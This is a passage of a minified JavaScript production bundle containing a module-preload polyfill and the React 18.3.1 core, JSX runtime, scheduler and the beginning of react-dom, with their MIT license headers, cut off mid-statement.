function vv(n,r){for(var o=0;o<r.length;o++){const a=r[o];if(typeof a!="string"&&!Array.isArray(a)){for(const c in a)if(c!=="default"&&!(c in n)){const p=Object.getOwnPropertyDescriptor(a,c);p&&Object.defineProperty(n,c,p.get?p:{enumerable:!0,get:()=>a[c]})}}}return Object.freeze(Object.defineProperty(n,Symbol.toStringTag,{value:"Module"}))}(function(){const r=document.createElement("link").relList;if(r&&r.supports&&r.supports("modulepreload"))return;for(const c of document.querySelectorAll('link[rel="modulepreload"]'))a(c);new MutationObserver(c=>{for(const p of c)if(p.type==="childList")for(const d of p.addedNodes)d.tagName==="LINK"&&d.rel==="modulepreload"&&a(d)}).observe(document,{childList:!0,subtree:!0});function o(c){const p={};return c.integrity&&(p.integrity=c.integrity),c.referrerPolicy&&(p.referrerPolicy=c.referrerPolicy),c.crossOrigin==="use-credentials"?p.credentials="include":c.crossOrigin==="anonymous"?p.credentials="omit":p.credentials="same-origin",p}function a(c){if(c.ep)return;c.ep=!0;const p=o(c);fetch(c.href,p)}})();function oc(n){return n&&n.__esModule&&Object.prototype.hasOwnProperty.call(n,"default")?n.default:n}var vl={exports:{}},yi={},bl={exports:{}},pe={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Dp;function bv(){if(Dp)return pe;Dp=1;var n=Symbol.for("react.element"),r=Symbol.for("react.portal"),o=Symbol.for("react.fragment"),a=Symbol.for("react.strict_mode"),c=Symbol.for("react.profiler"),p=Symbol.for("react.provider"),d=Symbol.for("react.context"),h=Symbol.for("react.forward_ref"),g=Symbol.for("react.suspense"),f=Symbol.for("react.memo"),y=Symbol.for("react.lazy"),v=Symbol.iterator;function w(S){return S===null||typeof S!="object"?null:(S=v&&S[v]||S["@@iterator"],typeof S=="function"?S:null)}var T={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},M=Object.assign,A={};function P(S,j,Z){this.props=S,this.context=j,this.refs=A,this.updater=Z||T}P.prototype.isReactComponent={},P.prototype.setState=function(S,j){if(typeof S!="object"&&typeof S!="function"&&S!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,S,j,"setState")},P.prototype.forceUpdate=function(S){this.updater.enqueueForceUpdate(this,S,"forceUpdate")};function O(){}O.prototype=P.prototype;function L(S,j,Z){this.props=S,this.context=j,this.refs=A,this.updater=Z||T}var N=L.prototype=new O;N.constructor=L,M(N,P.prototype),N.isPureReactComponent=!0;var B=Array.isArray,$=Object.prototype.hasOwnProperty,J={current:null},H={key:!0,ref:!0,__self:!0,__source:!0};function ee(S,j,Z){var ce,fe={},de=null,ke=null;if(j!=null)for(ce in j.ref!==void 0&&(ke=j.ref),j.key!==void 0&&(de=""+j.key),j)$.call(j,ce)&&!H.hasOwnProperty(ce)&&(fe[ce]=j[ce]);var we=arguments.length-2;if(we===1)fe.children=Z;else if(1<we){for(var Se=Array(we),Ue=0;Ue<we;Ue++)Se[Ue]=arguments[Ue+2];fe.children=Se}if(S&&S.defaultProps)for(ce in we=S.defaultProps,we)fe[ce]===void 0&&(fe[ce]=we[ce]);return{$$typeof:n,type:S,key:de,ref:ke,props:fe,_owner:J.current}}function le(S,j){return{$$typeof:n,type:S.type,key:j,ref:S.ref,props:S.props,_owner:S._owner}}function ve(S){return typeof S=="object"&&S!==null&&S.$$typeof===n}function Ae(S){var j={"=":"=0",":":"=2"};return"$"+S.replace(/[=:]/g,function(Z){return j[Z]})}var ne=/\/+/g;function be(S,j){return typeof S=="object"&&S!==null&&S.key!=null?Ae(""+S.key):j.toString(36)}function K(S,j,Z,ce,fe){var de=typeof S;(de==="undefined"||de==="boolean")&&(S=null);var ke=!1;if(S===null)ke=!0;else switch(de){case"string":case"number":ke=!0;break;case"object":switch(S.$$typeof){case n:case r:ke=!0}}if(ke)return ke=S,fe=fe(ke),S=ce===""?"."+be(ke,0):ce,B(fe)?(Z="",S!=null&&(Z=S.replace(ne,"$&/")+"/"),K(fe,j,Z,"",function(Ue){return Ue})):fe!=null&&(ve(fe)&&(fe=le(fe,Z+(!fe.key||ke&&ke.key===fe.key?"":(""+fe.key).replace(ne,"$&/")+"/")+S)),j.push(fe)),1;if(ke=0,ce=ce===""?".":ce+":",B(S))for(var we=0;we<S.length;we++){de=S[we];var Se=ce+be(de,we);ke+=K(de,j,Z,Se,fe)}else if(Se=w(S),typeof Se=="function")for(S=Se.call(S),we=0;!(de=S.next()).done;)de=de.value,Se=ce+be(de,we++),ke+=K(de,j,Z,Se,fe);else if(de==="object")throw j=String(S),Error("Objects are not valid as a React child (found: "+(j==="[object Object]"?"object with keys {"+Object.keys(S).join(", ")+"}":j)+"). If you meant to render a collection of children, use an array instead.");return ke}function ge(S,j,Z){if(S==null)return S;var ce=[],fe=0;return K(S,ce,"","",function(de){return j.call(Z,de,fe++)}),ce}function ae(S){if(S._status===-1){var j=S._result;j=j(),j.then(function(Z){(S._status===0||S._status===-1)&&(S._status=1,S._result=Z)},function(Z){(S._status===0||S._status===-1)&&(S._status=2,S._result=Z)}),S._status===-1&&(S._status=0,S._result=j)}if(S._status===1)return S._result.default;throw S._result}var ue={current:null},W={transition:null},q={ReactCurrentDispatcher:ue,ReactCurrentBatchConfig:W,ReactCurrentOwner:J};function U(){throw Error("act(...) is not supported in production builds of React.")}return pe.Children={map:ge,forEach:function(S,j,Z){ge(S,function(){j.apply(this,arguments)},Z)},count:function(S){var j=0;return ge(S,function(){j++}),j},toArray:function(S){return ge(S,function(j){return j})||[]},only:function(S){if(!ve(S))throw Error("React.Children.only expected to receive a single React element child.");return S}},pe.Component=P,pe.Fragment=o,pe.Profiler=c,pe.PureComponent=L,pe.StrictMode=a,pe.Suspense=g,pe.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=q,pe.act=U,pe.cloneElement=function(S,j,Z){if(S==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+S+".");var ce=M({},S.props),fe=S.key,de=S.ref,ke=S._owner;if(j!=null){if(j.ref!==void 0&&(de=j.ref,ke=J.current),j.key!==void 0&&(fe=""+j.key),S.type&&S.type.defaultProps)var we=S.type.defaultProps;for(Se in j)$.call(j,Se)&&!H.hasOwnProperty(Se)&&(ce[Se]=j[Se]===void 0&&we!==void 0?we[Se]:j[Se])}var Se=arguments.length-2;if(Se===1)ce.children=Z;else if(1<Se){we=Array(Se);for(var Ue=0;Ue<Se;Ue++)we[Ue]=arguments[Ue+2];ce.children=we}return{$$typeof:n,type:S.type,key:fe,ref:de,props:ce,_owner:ke}},pe.createContext=function(S){return S={$$typeof:d,_currentValue:S,_currentValue2:S,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},S.Provider={$$typeof:p,_context:S},S.Consumer=S},pe.createElement=ee,pe.createFactory=function(S){var j=ee.bind(null,S);return j.type=S,j},pe.createRef=function(){return{current:null}},pe.forwardRef=function(S){return{$$typeof:h,render:S}},pe.isValidElement=ve,pe.lazy=function(S){return{$$typeof:y,_payload:{_status:-1,_result:S},_init:ae}},pe.memo=function(S,j){return{$$typeof:f,type:S,compare:j===void 0?null:j}},pe.startTransition=function(S){var j=W.transition;W.transition={};try{S()}finally{W.transition=j}},pe.unstable_act=U,pe.useCallback=function(S,j){return ue.current.useCallback(S,j)},pe.useContext=function(S){return ue.current.useContext(S)},pe.useDebugValue=function(){},pe.useDeferredValue=function(S){return ue.current.useDeferredValue(S)},pe.useEffect=function(S,j){return ue.current.useEffect(S,j)},pe.useId=function(){return ue.current.useId()},pe.useImperativeHandle=function(S,j,Z){return ue.current.useImperativeHandle(S,j,Z)},pe.useInsertionEffect=function(S,j){return ue.current.useInsertionEffect(S,j)},pe.useLayoutEffect=function(S,j){return ue.current.useLayoutEffect(S,j)},pe.useMemo=function(S,j){return ue.current.useMemo(S,j)},pe.useReducer=function(S,j,Z){return ue.current.useReducer(S,j,Z)},pe.useRef=function(S){return ue.current.useRef(S)},pe.useState=function(S){return ue.current.useState(S)},pe.useSyncExternalStore=function(S,j,Z){return ue.current.useSyncExternalStore(S,j,Z)},pe.useTransition=function(){return ue.current.useTransition()},pe.version="18.3.1",pe}var Mp;function sc(){return Mp||(Mp=1,bl.exports=bv()),bl.exports}/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Rp;function wv(){if(Rp)return yi;Rp=1;var n=sc(),r=Symbol.for("react.element"),o=Symbol.for("react.fragment"),a=Object.prototype.hasOwnProperty,c=n.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,p={key:!0,ref:!0,__self:!0,__source:!0};function d(h,g,f){var y,v={},w=null,T=null;f!==void 0&&(w=""+f),g.key!==void 0&&(w=""+g.key),g.ref!==void 0&&(T=g.ref);for(y in g)a.call(g,y)&&!p.hasOwnProperty(y)&&(v[y]=g[y]);if(h&&h.defaultProps)for(y in g=h.defaultProps,g)v[y]===void 0&&(v[y]=g[y]);return{$$typeof:r,type:h,key:w,ref:T,props:v,_owner:c.current}}return yi.Fragment=o,yi.jsx=d,yi.jsxs=d,yi}var Np;function kv(){return Np||(Np=1,vl.exports=wv()),vl.exports}var x=kv(),I=sc();const Te=oc(I),xv=vv({__proto__:null,default:Te},[I]);var Ko={},wl={exports:{}},ut={},kl={exports:{}},xl={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Lp;function Sv(){return Lp||(Lp=1,function(n){function r(W,q){var U=W.length;W.push(q);e:for(;0<U;){var S=U-1>>>1,j=W[S];if(0<c(j,q))W[S]=q,W[U]=j,U=S;else break e}}function o(W){return W.length===0?null:W[0]}function a(W){if(W.length===0)return null;var q=W[0],U=W.pop();if(U!==q){W[0]=U;e:for(var S=0,j=W.length,Z=j>>>1;S<Z;){var ce=2*(S+1)-1,fe=W[ce],de=ce+1,ke=W[de];if(0>c(fe,U))de<j&&0>c(ke,fe)?(W[S]=ke,W[de]=U,S=de):(W[S]=fe,W[ce]=U,S=ce);else if(de<j&&0>c(ke,U))W[S]=ke,W[de]=U,S=de;else break e}}return q}function c(W,q){var U=W.sortIndex-q.sortIndex;return U!==0?U:W.id-q.id}if(typeof performance=="object"&&typeof performance.now=="function"){var p=performance;n.unstable_now=function(){return p.now()}}else{var d=Date,h=d.now();n.unstable_now=function(){return d.now()-h}}var g=[],f=[],y=1,v=null,w=3,T=!1,M=!1,A=!1,P=typeof setTimeout=="function"?setTimeout:null,O=typeof clearTimeout=="function"?clearTimeout:null,L=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function N(W){for(var q=o(f);q!==null;){if(q.callback===null)a(f);else if(q.startTime<=W)a(f),q.sortIndex=q.expirationTime,r(g,q);else break;q=o(f)}}function B(W){if(A=!1,N(W),!M)if(o(g)!==null)M=!0,ae($);else{var q=o(f);q!==null&&ue(B,q.startTime-W)}}function $(W,q){M=!1,A&&(A=!1,O(ee),ee=-1),T=!0;var U=w;try{for(N(q),v=o(g);v!==null&&(!(v.expirationTime>q)||W&&!Ae());){var S=v.callback;if(typeof S=="function"){v.callback=null,w=v.priorityLevel;var j=S(v.expirationTime<=q);q=n.unstable_now(),typeof j=="function"?v.callback=j:v===o(g)&&a(g),N(q)}else a(g);v=o(g)}if(v!==null)var Z=!0;else{var ce=o(f);ce!==null&&ue(B,ce.startTime-q),Z=!1}return Z}finally{v=null,w=U,T=!1}}var J=!1,H=null,ee=-1,le=5,ve=-1;function Ae(){return!(n.unstable_now()-ve<le)}function ne(){if(H!==null){var W=n.unstable_now();ve=W;var q=!0;try{q=H(!0,W)}finally{q?be():(J=!1,H=null)}}else J=!1}var be;if(typeof L=="function")be=function(){L(ne)};else if(typeof MessageChannel<"u"){var K=new MessageChannel,ge=K.port2;K.port1.onmessage=ne,be=function(){ge.postMessage(null)}}else be=function(){P(ne,0)};function ae(W){H=W,J||(J=!0,be())}function ue(W,q){ee=P(function(){W(n.unstable_now())},q)}n.unstable_IdlePriority=5,n.unstable_ImmediatePriority=1,n.unstable_LowPriority=4,n.unstable_NormalPriority=3,n.unstable_Profiling=null,n.unstable_UserBlockingPriority=2,n.unstable_cancelCallback=function(W){W.callback=null},n.unstable_continueExecution=function(){M||T||(M=!0,ae($))},n.unstable_forceFrameRate=function(W){0>W||125<W?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):le=0<W?Math.floor(1e3/W):5},n.unstable_getCurrentPriorityLevel=function(){return w},n.unstable_getFirstCallbackNode=function(){return o(g)},n.unstable_next=function(W){switch(w){case 1:case 2:case 3:var q=3;break;default:q=w}var U=w;w=q;try{return W()}finally{w=U}},n.unstable_pauseExecution=function(){},n.unstable_requestPaint=function(){},n.unstable_runWithPriority=function(W,q){switch(W){case 1:case 2:case 3:case 4:case 5:break;default:W=3}var U=w;w=W;try{return q()}finally{w=U}},n.unstable_scheduleCallback=function(W,q,U){var S=n.unstable_now();switch(typeof U=="object"&&U!==null?(U=U.delay,U=typeof U=="number"&&0<U?S+U:S):U=S,W){case 1:var j=-1;break;case 2:j=250;break;case 5:j=1073741823;break;case 4:j=1e4;break;default:j=5e3}return j=U+j,W={id:y++,callback:q,priorityLevel:W,startTime:U,expirationTime:j,sortIndex:-1},U>S?(W.sortIndex=U,r(f,W),o(g)===null&&W===o(f)&&(A?(O(ee),ee=-1):A=!0,ue(B,U-S))):(W.sortIndex=j,r(g,W),M||T||(M=!0,ae($))),W},n.unstable_shouldYield=Ae,n.unstable_wrapCallback=function(W){var q=w;return function(){var U=w;w=q;try{return W.apply(this,arguments)}finally{w=U}}}}(xl)),xl}var jp;function Tv(){return jp||(jp=1,kl.exports=Sv()),kl.exports}/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Bp;function Cv(){if(Bp)return ut;Bp=1;var n=sc(),r=Tv();function o(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,i=1;i<arguments.length;i++)t+="&args[]="+encodeURIComponent(arguments[i]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var a=new Set,c={};function p(e,t){d(e,t),d(e+"Capture",t)}function d(e,t){for(c[e]=t,e=0;e<t.length;e++)a.add(t[e])}var h=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),g=Object.prototype.hasOwnProperty,f=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,y={},v={};function w(e){return g.call(v,e)?!0:g.call(y,e)?!1:f.test(e)?v[e]=!0:(y[e]=!0,!1)}function T(e,t,i,s){if(i!==null&&i.type===0)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return s?!1:i!==null?!i.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function M(e,t,i,s){if(t===null||typeof t>"u"||T(e,t,i,s))return!0;if(s)return!1;if(i!==null)switch(i.type){case 3:return!t;case 4:return t===!1;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function A(e,t,i,s,l,u,m){this.acceptsBooleans=t===2||t===3||t===4,this.attributeName=s,this.attributeNamespace=l,this.mustUseProperty=i,this.propertyName=e,this.type=t,this.sanitizeURL=u,this.removeEmptyString=m}var P={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){P[e]=new A(e,0,!1,e,null,!1,!1)}),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];P[t]=new A(t,1,!1,e[1],null,!1,!1)}),["contentEditable","draggable","spellCheck","value"].forEach(function(e){P[e]=new A(e,2,!1,e.toLowerCase(),null,!1,!1)}),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){P[e]=new A(e,2,!1,e,null,!1,!1)}),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){P[e]=new A(e,3,!1,e.toLowerCase(),null,!1,!1)}),["checked","multiple","muted","selected"].forEach(function(e){P[e]=new A(e,3,!0,e,null,!1,!1)}),["capture","download"].forEach(function(e){P[e]=new A(e,4,!1,e,null,!1,!1)}),["cols","rows","size","span"].forEach(function(e){P[e]=new A(e,6,!1,e,null,!1,!1)}),["rowSpan","start"].forEach(function(e){P[e]=new A(e,5,!1,e.toLowerCase(),null,!1,!1)});var O=/[\-:]([a-z])/g;function L(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace(O,L);P[t]=new A(t,1,!1,e,null,!1,!1)}),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace(O,L);P[t]=new A(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)}),["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace(O,L);P[t]=new A(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)}),["tabIndex","crossOrigin"].forEach(function(e){P[e]=new A(e,1,!1,e.toLowerCase(),null,!1,!1)}),P.xlinkHref=new A("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach(function(e){P[e]=new A(e,1,!1,e.toLowerCase(),null,!0,!0)});function N(e,t,i,s){var l=P.hasOwnProperty(t)?P[t]:null;(l!==null?l.type!==0:s||!(2<t.length)||t[0]!=="o"&&t[0]!=="O"||t[1]!=="n"&&t[1]!=="N")&&(M(t,i,l,s)&&(i=null),s||l===null?w(t)&&(i===null?e.removeAttribute(t):e.setAttribute(t,""+i)):l.mustUseProperty?e[l.propertyName]=i===null?l.type===3?!1:"":i:(t=l.attributeName,s=l.attributeNamespace,i===null?e.removeAttribute(t):(l=l.type,i=l===3||l===4&&i===!0?"":""+i,s?e.setAttributeNS(s,t,i):e.setAttribute(t,i))))}var B=n.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,$=Symbol.for("react.element"),J=Symbol.for("react.portal"),H=Symbol.for("react.fragment"),ee=Symbol.for("react.strict_mode"),le=Symbol.for("react.profiler"),ve=Symbol.for("react.provider"),Ae=Symbol.for("react.context"),ne=Symbol.for("react.forward_ref"),be=Symbol.for("react.suspense"),K=Symbol.for("react.suspense_list"),ge=Symbol.for("react.memo"),ae=Symbol.for("react.lazy"),ue=Symbol.for("react.offscreen"),W=Symbol.iterator;function q(e){return e===null||typeof e!="object"?null:(e=W&&e[W]||e["@@iterator"],typeof e=="function"?e:null)}var U=Object.assign,S;function j(e){if(S===void 0)try{throw Error()}catch(i){var t=i.stack.trim().match(/\n( *(at )?)/);S=t&&t[1]||""}return`
`+S+e}var Z=!1;function ce(e,t){if(!e||Z)return"";Z=!0;var i=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(t,[])}catch(R){var s=R}Reflect.construct(e,[],t)}else{try{t.call()}catch(R){s=R}e.call(t.prototype)}else{try{throw Error()}catch(R){s=R}e()}}catch(R){if(R&&s&&typeof R.stack=="string"){for(var l=R.stack.split(`
`),u=s.stack.split(`
`),m=l.length-1,b=u.length-1;1<=m&&0<=b&&l[m]!==u[b];)b--;for(;1<=m&&0<=b;m--,b--)if(l[m]!==u[b]){if(m!==1||b!==1)do if(m--,b--,0>b||l[m]!==u[b]){var k=`
`+l[m].replace(" at new "," at ");return e.displayName&&k.includes("<anonymous>")&&(k=k.replace("<anonymous>",e.displayName)),k}while(1<=m&&0<=b);break}}}finally{Z=!1,Error.prepareStackTrace=i}return(e=e?e.displayName||e.name:"")?j(e):""}function fe(e){switch(e.tag){case 5:return j(e.type);case 16:return j("Lazy");case 13:return j("Suspense");case 19:return j("SuspenseList");case 0:case 2:case 15:return e=ce(e.type,!1),e;case 11:return e=ce(e.type.render,!1),e;case 1:return e=ce(e.type,!0),e;default:return""}}function de(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case H:return"Fragment";case J:return"Portal";case le:return"Profiler";case ee:return"StrictMode";case be:return"Suspense";case K:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case Ae:return(e.displayName||"Context")+".Consumer";case ve:return(e._context.displayName||"Context")+".Provider";case ne:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case ge:return t=e.displayName||null,t!==null?t:de(e.type)||"Memo";case ae:t=e._payload,e=e._init;try{return de(e(t))}catch{}}return null}function ke(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=t.render,e=e.displayName||e.name||"",t.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return de(t);case 8:return t===ee?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t}return null}function we(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Se(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Ue(e){var t=Se(e)?"checked":"value",i=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),s=""+e[t];if(!e.hasOwnProperty(t)&&typeof i<"u"&&typeof i.get=="function"&&typeof i.set=="function"){var l=i.get,u=i.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return l.call(this)},set:function(m){s=""+m,u.call(this,m)}}),Object.defineProperty(e,t,{enumerable:i.enumerable}),{getValue:function(){return s},setValue:function(m){s=""+m},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function bt(e){e._valueTracker||(e._valueTracker=Ue(e))}function Ts(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var i=t.getValue(),s="";return e&&(s=Se(e)?e.checked?"true":"false":e.value),e=s,e!==i?(t.setValue(e),!0):!1}function Fi(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function Cs(e,t){var i=t.checked;return U({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:i??e._wrapperState.initialChecked})}function Fc(e,t){var i=t.defaultValue==null?"":t.defaultValue,s=t.checked!=null?t.checked:t.defaultChecked;i=we(t.value!=null?t.value:i),e._wrapperState={initialChecked:s,initialValue:i,controlled:t.type==="checkbox"||t.type==="radio"?t.checked!=null:t.value!=null}}function Vc(e,t){t=t.checked,t!=null&&N(e,"checked",t,!1)}function As(e,t){Vc(e,t);var i=we(t.value),s=t.type;if(i!=null)s==="number"?(i===0&&e.value===""||e.value!=i)&&(e.value=""+i):e.value!==""+i&&(e.value=""+i);else if(s==="submit"||s==="reset"){e.removeAttribute("value");return}t.hasOwnProperty("value")?Ps(e,t.type,i):t.hasOwnProperty("defaultValue")&&Ps(e,t.type,we(t.defaultValue)),t.checked==null&&t.defaultChecked!=null&&(e.defaultChecked=!!t.defaultChecked)}function Oc(e,t,i){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var s=t.type;if(!(s!=="submit"&&s!=="reset"||t.value!==void 0&&t.value!==null))return;t=""+e._wrapperState.initialValue,i||t===e.value||(e.value=t),e.defaultValue=t}i=e.name,i!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,i!==""&&(e.name=i)}function Ps(e,t,i){(t!=="number"||Fi(e.ownerDocument)!==e)&&(i==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+i&&(e.defaultValue=""+i))}var Rr=Array.isArray;function tr(e,t,i,s){if(e=e.options,t){t={};for(var l=0;l<i.length;l++)t["$"+i[l]]=!0;for(i=0;i<e.length;i++)l=t.hasOwnProperty("$"+e[i].value),e[i].selected!==l&&(e[i].selected=l),l&&s&&(e[i].defaultSelected=!0)}else{for(i=""+we(i),t=null,l=0;l<e.length;l++){if(e[l].value===i){e[l].selected=!0,s&&(e[l].defaultSelected=!0);return}t!==null||e[l].disabled||(t=e[l])}t!==null&&(t.selected=!0)}}function Es(e,t){if(t.dangerouslySetInnerHTML!=null)throw Error(o(91));return U({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function zc(e,t){var i=t.value;if(i==null){if(i=t.children,t=t.defaultValue,i!=null){if(t!=null)throw Error(o(92));if(Rr(i)){if(1<i.length)throw Error(o(93));i=i[0]}t=i}t==null&&(t=""),i=t}e._wrapperState={initialValue:we(i)}}function _c(e,t){var i=we(t.value),s=we(t.defaultValue);i!=null&&(i=""+i,i!==e.value&&(e.value=i),t.defaultValue==null&&e.defaultValue!==i&&(e.defaultValue=i)),s!=null&&(e.defaultValue=""+s)}function Wc(e){var t=e.textContent;t===e._wrapperState.initialValue&&t!==""&&t!==null&&(e.value=t)}function Uc(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Is(e,t){return e==null||e==="http://www.w3.org/1999/xhtml"?Uc(t):e==="http://www.w3.org/2000/svg"&&t==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var Vi,Hc=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(t,i,s,l){MSApp.execUnsafeLocalFunction(function(){return e(t,i,s,l)})}:e}(function(e,t){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=t;else{for(Vi=Vi||document.createElement("div"),Vi.innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=Vi.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}});function Nr(e,t){if(t){var i=e.firstChild;if(i&&i===e.lastChild&&i.nodeType===3){i.nodeValue=t;return}}e.textContent=t}var Lr={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},xm=["Webkit","ms","Moz","O"];Object.keys(Lr).forEach(function(e){xm.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),Lr[t]=Lr[e]})});function Gc(e,t,i){return t==null||typeof t=="boolean"||t===""?"":i||typeof t!="number"||t===0||Lr.hasOwnProperty(e)&&Lr[e]?(""+t).trim():t+"px"}function $c(e,t){e=e.style;for(var i in t)if(t.hasOwnProperty(i)){var s=i.indexOf("--")===0,l=Gc(i,t[i],s);i==="float"&&(i="cssFloat"),s?e.setProperty(i,l):e[i]=l}}var 